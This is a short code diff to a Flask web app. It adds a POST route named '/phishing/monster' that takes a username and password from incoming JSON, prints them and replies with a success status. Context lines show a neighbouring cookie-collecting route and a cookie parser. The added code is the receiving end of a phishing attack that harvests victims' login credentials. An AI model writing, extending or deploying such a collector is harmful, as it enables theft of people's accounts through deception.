@@ -187,6 +187,26 @@ def get_cookies():
         }
     )
 
+@app.route('/phishing/monster', methods=['POST'])
+def get_credentials():
+
+    data = request.get_json()
+    
+    username = data['username']
+    password = data['password']
+
+
+    print(username)
+    print(password)
+
+    return jsonify(
+        {
+            "status": "sucess",
+        }
+    )
+
+
+
 def parse_cookie_string(cookie_string):
 
     items = [item.split('=') for item in cookie_string.split(';')]
